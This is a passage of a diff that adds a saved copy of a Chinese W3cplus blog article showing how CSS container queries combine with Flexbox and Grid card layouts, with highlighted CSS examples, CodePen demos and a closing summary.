+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">0</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+    <span class="class"><span class="class">.card</span></span><span class="pseudo"><span class="pseudo">:last-child</span></span> <span class="class"><span class="class">.card__thumbnail</span></span> <span class="rules"><span class="rules">{
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> thumbnail;</span></span></span><span class="value"></span></span>
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">aspect-ratio</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span> / <span class="number"><span class="number">1</span></span>;</span></span></span><span class="value"></span></span>
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">border-radius</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">12</span></span>px <span class="number"><span class="number">0</span></span> <span class="number"><span class="number">0</span></span> <span class="number"><span class="number">12</span></span>px;</span></span></span><span class="value"></span></span>
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">z-index</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+    <span class="class"><span class="class">.card</span></span><span class="pseudo"><span class="pseudo">:last-child</span></span> <span class="class"><span class="class">.card__badge</span></span> <span class="rules"><span class="rules">{
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> thumbnail;</span></span></span><span class="value"></span></span>
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">z-index</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> flex;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+    <span class="class"><span class="class">.card</span></span><span class="pseudo"><span class="pseudo">:last-child</span></span> <span class="class"><span class="class">.card__describe</span></span> <span class="rules"><span class="rules">{
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> describe;</span></span></span><span class="value"></span></span>
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">align-self</span></span></span><span class="rule">:<span class="value"><span class="value"> start;</span></span></span><span class="value"></span></span>
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> flex;</span></span></span><span class="value"></span></span>
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">margin-top</span></span></span><span class="rule">:<span class="value"><span class="value"> -<span class="number"><span class="number">24</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+    <span class="class"><span class="class">.card</span></span><span class="pseudo"><span class="pseudo">:last-child</span></span> <span class="class"><span class="class">.card__title</span></span> <span class="rules"><span class="rules">{
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> title;</span></span></span><span class="value"></span></span>
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">margin-top</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">20</span></span>px;</span></span></span><span class="value"></span></span>
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">align-self</span></span></span><span class="rule">:<span class="value"><span class="value"> start;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+    <span class="class"><span class="class">.card</span></span><span class="pseudo"><span class="pseudo">:last-child</span></span> <span class="class"><span class="class">.card__button</span></span> <span class="rules"><span class="rules">{
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> button;</span></span></span><span class="value"></span></span>
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">align-self</span></span></span><span class="rule">:<span class="value"><span class="value"> end;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+}
+</code></pre>
+
+<p>容器<code>.container</code>宽度在 <code>480px ~ 768px</code> 之间，单独调整了第三个卡片的布局。</p>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="Untitled" src="./现代Web技术让我们离容器查询更近一步_files/QWMzzNL(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/QWMzzNL">
+  Untitled</a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>调整示例中的滑块，你看到的效果如下：</p>
+
+<div style="margin-bottom: 20px">
+<video controls="" width="100%" style="width: 100%; aspect-ratio: 16 / 9;" poster="/sites/default/files/blogs/2021/2111/css-container-queries-flexbox-grid-18.jpg">
+    <source src="/sites/default/files/blogs/2021/2111/css-container-queries-flexbox-grid-18.mp4" type="video/mp4">
+</video>
+</div>
+
+<p>最后再看 CSS容器查询在 CSS Grid 中的使用，它和在Flexbox中的使用是相似的，只不过在容器查询中的为第三个卡片重置了<code>grid-column</code>：</p>
+
+<pre class="css"><code class="css"><span class="at_rule"><span class="at_rule">@container (min-width: <span class="number"><span class="number">480</span></span>px) and (max-width: <span class="number"><span class="number">768</span></span>px) </span></span>{
+    <span class="class"><span class="class">.card</span></span><span class="pseudo"><span class="pseudo">:last-child</span></span> <span class="rules"><span class="rules">{
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span> / -<span class="number"><span class="number">1</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+}
+</code></pre>
+
+<p>其他代码是相同的，不在这里展示，最终效果如下：</p>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="Untitled" src="./现代Web技术让我们离容器查询更近一步_files/zYdyeYj(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/zYdyeYj">
+  Untitled</a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<h2 class="content-title" data-index="2">小结</h2>
+
+<p>我们在这篇文章中探讨了一些现代Web布局技术怎么让我们离容器查询越来越近。在文章中我们分别使用 Flexbox 和 Grid 布局技术，怎么来实现容器响应的布局。虽然在某些场景之下，这些现代Web布局技术让我们实现的效果看似容器查询的效果，但和我们所说的真正的容器查询还是有一定的差异的。如果要真正实现同一组件在不同容器尺寸下实现响应不同的UI变化，还是需要真正的CSS容器查询特性。当然，我们在 Flexbox 和 Grid 中使用 CSS容器查询，可以让我们构建的响应式布局更为灵活。</p>
+
+<p>我们前后花了三篇篇幅来介绍CSS容器查询，但都是围绕着怎么使用来展开的。那么 CSS 容器查询会给设计又带来哪些变化呢？如果你对这个话题也感兴趣的话，请关注下一篇的更新，我将在下一篇中和大家一起来聊聊 CSS 容器查询给设计带来哪些变化。</p>
+</div></div></div>  </div>
+
+  
+   
+    <div id="node_footer" class="clearfix">
+              <div class="previous-next"><span class="prev">上一篇: </span><a href="https://www.w3cplus.com/css/container-queries-with-container-and-at-container.html" target="_blank">容器查询中的 container 和 @container</a> | <span class="next">下一篇: </span><a href="https://www.w3cplus.com/css/container-queries-for-design.html" target="_blank">容器查询给设计带来的变化</a></div>            
+    </div>
+
+        
+
+</div>  </div>
+</div>
+  </div>
+
+        </div>
+
+      </div>
+    </div>
+
+    
+          <div id="sidebar-second" class="col-extra" style="position: sticky; top: 80px;">
+        <!-- <script type="text/javascript">document.write(unescape('%3Cdiv id="bdcs"%3E%3C/div%3E%3Cscript charset="utf-8" src="//rp.baidu.com/rp3w/3w.js?sid=10994702955876242907') + '&t=' + (Math.ceil(new Date()/3600000)) + unescape('"%3E%3C/script%3E'));</script> -->
+          <div class="region region-sidebar-second">
+    <div id="block-custom-search-blocks-1" class="block block-custom-search-blocks">
+
+    
+  <div class="content">
+    <form class="search-form" role="search" action="https://www.w3cplus.com/css/modern-web-technologies-take-us-a-step-further-from-container-queries.html?expire=1699762392&amp;code=U3VNHbFcx-0&amp;sign=8715c12d4e4a37e5784da684715a0e98" method="post" id="custom-search-blocks-form-1" accept-charset="UTF-8" target="_self"><div><div class="form-item form-type-textfield form-item-custom-search-blocks-form-1">
+  <label class="element-invisible" for="edit-custom-search-blocks-form-1--2">Search this site </label>
+ <input title="请输入您想搜索的关键词。" class="custom-search-box form-text" placeholder="" type="text" id="edit-custom-search-blocks-form-1--2" name="custom_search_blocks_form_1" value="" size="15" maxlength="128">
+</div>
+<input type="hidden" name="delta" value="1">
+<input type="hidden" name="form_build_id" value="form-hTlSKLY-vBOrhZ79neM2G2PNsl3tDhDbWYUxLtfnx-A">
+<input type="hidden" name="form_id" value="custom_search_blocks_form_1">
+<div class="form-actions form-wrapper" id="edit-actions"><input type="submit" id="edit-submit" name="op" value="搜索" class="form-submit"></div></div></form>  </div>
+</div>
+<div id="block-block-53" class="block block-block">
+
+    <h2>直达目的地(^_^)</h2>
+  
+  <div class="content">
+    <div class="node-blog-title"><div class="atalog"><ul class="mb-2"> <li><a data-index="0" href="javascript:;" class="">背景</a></li><li><a data-index="1" href="javascript:;">问题所在</a></li><li><a data-index="2" href="javascript:;">使用现代Web技术创建响应容器或内容宽度的样式</a></li><li> <ul class="mb-2"><li><a data-index="3" href="javascript:;">使用 Flexbox 的容器查询解决方案</a></li><li><a data-index="4" href="javascript:;">使用 Grid 的容器查询解决方案</a></li></ul></li><li><a data-index="5" href="javascript:;">现代Web技术创建的响应容器存在的缺陷</a></li><li><a data-index="6" href="javascript:;" class="active">容器查询和现代Web布局技术的融合</a></li><li><a data-index="7" href="javascript:;">小结</a></li></ul></div></div>
+
+<script>
+$('.node-blog h2').addClass('content-title');
+$('.node-blog h3').addClass('content-title');
+$('.node-blog h4').addClass('content-title');
+$('.node-blog h5').addClass('content-title');
+//  给 h2 到 h5 增加一个 data-index 的自定义属性
+$('.node-blog h2').attr('data-index', 2);
+$('.node-blog h3').attr('data-index', 3);
+$('.node-blog h4').attr('data-index', 4);
+$('.node-blog h5').attr('data-index', 5);
+
+//  函数的一个参数是标题级别，第二个参数是第一个标题的索引值
+function atalog(titleIndex, start) {
+    //  存储 HTML 和当前的索引值
+    var el = {
+        el: '',
+        index: start
+    };
+    var current = 0;  //  已遍历的数量
+
+    for (var i = start;i < $('.content-title').length;i ++) {
+        if (i < current) {
+            //  如果当前 i 的值小于已遍历的数量就跳过
+            continue;
+        }
+
+        if ($('.content-title').eq(i).attr('data-index') > titleIndex) {
+            //  如果是更小一级的标题就调用自身继续查找
+            var result = atalog($('.content-title').eq(i).attr('data-index'), i);
+            //  把返回的 HTML 添加到当前函数的 el 中
+            el.el += '<li> ' + result.el + '</li>';
+            current = result.index + 1;  //  设置已遍历的数量
+            el.index = result.index;  //  设置索引
+            continue;  //  跳过本次循环
+        }
+
+        if ($('.content-title').eq(i).attr('data-index') < titleIndex) {
+            //  如果是更大一级的标题就返回已生成的 HTML 目录
+            el.el = '<ul class="mb-2">' + el.el + '</ul>';
+            return el;
+        }
+        //  生成 HTML 目录
+        el.el += '<li><a data-index="' + i + '" href="javascript:;">' + $('.content-title').eq(i).text() + '</a></li>';
+        el.index = i;  //  设置当前的索引值为 i
+    }
+    //  添加列表的外层 ul
+    el.el = '<ul class="mb-2"> ' + el.el + '</ul>';
+    return el;  //  返回生成的 HTML 目录
+}
+
+//  调用生成目录的函数，从第 0 个 h2 开始
+var el = atalog(2, 0);
+//  把生成的目录插入到文章的开头
+$('.node-blog-title').prepend('<div class="atalog">' + el.el + '</div>');
+$(".node-blog-title .atalog > ul > li >a ").eq(0).addClass('active');
+//  给生成的目录添加点击事件
+$('.node-blog-title .atalog a').on('click', function () {
+    //  设置滚动条的高度为标题的 offsetTop
+     var topPos = $('.content-title').eq($(this).attr('data-index')).offset().top;
+var position = topPos - 80;
+    $(document).scrollTop(position);
+$('.node-blog-title .atalog a').removeClass('active')
+    $(this).toggleClass('active')
+});
+
+
+</script>
+
+  </div>
+</div>
+<div id="block-block-49" class="block block-block">
+
+    
+  <div class="content">
+    <div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/iJrTure4/" target="_blank" title="现代 CSS"><img src="./现代Web技术让我们离容器查询更近一步_files/css-1.jpg" border="0" alt="" width="300"></a></div>
+
+<div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/DEHQUMj/" target="_blank" title="防御式 CSS 精讲"><img src="./现代Web技术让我们离容器查询更近一步_files/css-3.jpg" border="0" alt="" width="300"></a></div>
+
+<div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/iJrwMDDU/" target="_blank" title="现代 Web 布局"><img src="./现代Web技术让我们离容器查询更近一步_files/css-2.jpg" border="0" alt="" width="300"></a></div>
+
+
+  </div>
+</div>
+  </div>
+      </div>
+    
+
+  </div>
+</div>
+
+  <div id="footer-col" class="footer-col">
+    <div class="container">
+        <div class="region region-footer-col">
+    <div id="block-block-39" class="block block-block">
+
+    <h2>关于我们</h2>
+  
+  <div class="content">
+    <a class="media-object" href="http://www.w3cplus.com/">W3cplus</a>
+<div class="media-body">
+	<p>W3cplus是一个致力于推广国内前端行业的技术博客。它以探索为己任，不断活跃在行业技术最前沿，努力提供高质量前端技术博文；其文章范围广泛，主要以CSS、HTML、JavaScript、A11Y、动画等教程为主。</p>
+</div>
+  </div>
+</div>
+<div id="block-block-40" class="block block-block">
+
+    <h2>关于站长</h2>
+  
+  <div class="content">
+    <p><a class="media-object" href="https://www.w3cplus.com/" target="_blank">大漠</a></p>
+<div class="media-body">
+	<p>常用昵称“大漠”，<a href="https://www.w3cplus.com/" target="_blank">W3CPlus</a>创始人，曾就职于淘宝。对HTML、CSS和A11Y等领域有一定的认识和丰富的实践经验。现在主要从事智能UI领域的探讨和学习！。CSS和Drupal中国布道者。2014年出版《<a href="https://www.w3cplus.com/book-comment.html">图解CSS3：核心技术与案例实战</a>》。</p>
+	<div class="social">
+		<a rel="nofollow" class="github" href="https://github.com/airen" target="_blank" title="github">github</a> <a rel="nofollow" class="twitter" href="https://twitter.com/w3cplus" target="_blank" title="twitter">twitter</a></div>
+</div>
+<p>&nbsp;</p>
+  </div>
+</div>
+<div id="block-block-41" class="block block-block">
+
+    <h2>我的作品</h2>
+  
+  <div class="content">
+    <a class="media-object" href="https://www.w3cplus.com/book-comment.html" target="_blank">图解CSS3</a>
+<div class="media-body">
+	<p>本书是历时2载的心血之作，根据最新的CSS撰写，融入了作者在CSS领域多年的使用经验，旨在将本书打造成为CSS领域最权威和实用的专业著作，供没有经验的读者系统学习，供有经验的读者参考备查。新版在《<a href="https://www.w3cplus.com/blog/tags/674.html">图解SS</a>》中持续更新！</p></div>
+  </div>
+</div>
+  </div>
+    </div>
+  </div> 
+
+  <div id="footer" class="footer">
+    <div class="container">
+        <div class="region region-footer">
+    <div id="block-block-54" class="block block-block">
+
+    
+  <div class="content">
+        <p><a rel="nofollow" href="http://www.beian.miit.gov.cn/" target="_blank">湘B2-20110104-7</a>，衡阳市雅米信息技术有限公司 © 2011-2022 <a href="https://www.w3cplus.com/page/26.html" target="_blank">W3CPLUS</a>，感谢<a rel="nofollow" href="https://www.drupal.org/" target="_blank">Drupal</a>开源技术。感谢<a rel="nofollow" href="https://www.qiniu.com/" target="_blank">七牛云存储</a>提供静态资源空间。</p>
+  </div>
+</div>
+  </div>
+    </div>
+  </div> 
+
+<div id="totop" style="position: fixed; bottom: 50px; right: 15px; cursor: pointer; z-index: 999999; display: block; opacity: 1;">
+  <!-- <div id="zhi12-shang-exp-2" class="shang-wrap" style="text-align: center;position:absolute;right: 0;bottom: 130%;z-index: 9999;">
+    <div><a class="zhi12-popup zhi12-widget" rel="nofollow" href="//www.zhi12.com/paycenter/reward?entity=user&id=5491" target="_blank"><img src="/sites/default/files/blogs/2019/1905/w3cplus-shang-2.png" alt="打赏" class="share-img" /></a></div>
+</div> -->
+    <a id="topLink" title="返回顶部">返回顶部</a>
+</div>  <script type="text/javascript" src="./现代Web技术让我们离容器查询更近一步_files/js_VU7P4CTgUZdF2SyFko5LLAg9ZK0OSVjXVaAFnTLgVt0.js.下载"></script>
+  
+  <script type="text/javascript" src="./现代Web技术让我们离容器查询更近一步_files/respond.min.js.下载"></script>
+<script type="text/javascript" src="./现代Web技术让我们离容器查询更近一步_files/js_ypadrG4kz9-JBpNOXmgjyVozLCJG_1RP3Ig-iqWR8n0.js.下载"></script>
+<script type="text/javascript" src="./现代Web技术让我们离容器查询更近一步_files/js_YFY-zVcRx2bEEpwBdCXta7mOli3xeW_KMe7Y6Mv8zGk.js.下载"></script>
+<script type="text/javascript" src="./现代Web技术让我们离容器查询更近一步_files/js_xP4aMPEI1iZ1ZrZMlSgsTllQqvH8oWbOQ7JVFWyrFCo.js.下载"></script>
+<script type="text/javascript">
+<!--//--><![CDATA[//><!--
+jQuery.extend(Drupal.settings, {"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"w3cplusV2","theme_token":"3WM_sWKJLpRi9YijzZGSqf-qyODj04NbFlipT-S13OQ","js":{"modules\/statistics\/statistics.js":1,"sites\/all\/modules\/contrib\/respondjs\/lib\/respond.min.js":1,"sites\/all\/modules\/contrib\/jquery_update\/replace\/jquery\/1.10\/jquery.min.js":1,"misc\/jquery-extend-3.4.0.js":1,"misc\/jquery-html-prefilter-3.5.0-backport.js":1,"misc\/jquery.once.js":1,"misc\/drupal.js":1,"public:\/\/languages\/zh-hans_71GwLEjcRL9b45LGd77xwMMW4YJ5etdnokx7XZMwKAc.js":1,"sites\/all\/modules\/contrib\/custom_search\/js\/custom_search.js":1,"sites\/all\/themes\/w3cplusV2\/js\/highlight.pack.js":1,"sites\/all\/themes\/w3cplusV2\/js\/main.js":1},"css":{"modules\/system\/system.base.css":1,"modules\/system\/system.menus.css":1,"modules\/system\/system.messages.css":1,"modules\/system\/system.theme.css":1,"modules\/field\/theme\/field.css":1,"modules\/node\/node.css":1,"modules\/search\/search.css":1,"modules\/user\/user.css":1,"sites\/all\/modules\/contrib\/views\/css\/views.css":1,"sites\/all\/modules\/contrib\/ckeditor\/ckeditor.css":1,"sites\/all\/modules\/contrib\/ctools\/css\/ctools.css":1,"sites\/all\/modules\/contrib\/paywall\/includes\/paywall_php_sdk\/paywall.css":1,"sites\/all\/modules\/contrib\/custom_search\/custom_search.css":1,"sites\/all\/themes\/w3cplusV2\/css\/style.css":1}},"custom_search":{"form_target":"_self","solr":0},"statistics":{"data":{"nid":"2764"},"url":"\/modules\/statistics\/statistics.php"},"urlIsAjaxTrusted":{"\/css\/modern-web-technologies-take-us-a-step-further-from-container-queries.html?expire=1699762392\u0026code=U3VNHbFcx-0\u0026sign=8715c12d4e4a37e5784da684715a0e98":true}});
+//--><!]]>
+</script>
+<script src="./现代Web技术让我们离容器查询更近一步_files/jquery.colorbox-min.js.下载"></script>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?177319b798978621f83845b12c86fa29";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>  
+<span class="b895a"></span>
+<div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;"><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cboxContent" style="float: left;"><div id="cboxTitle" style="float: left;"></div><div id="cboxCurrent" style="float: left;"></div><button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button type="button" id="cboxSlideshow"></button><div id="cboxLoadingOverlay" style="float: left;"></div><div id="cboxLoadingGraphic" style="float: left;"></div></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none; max-width: none;"></div></div></body></html>
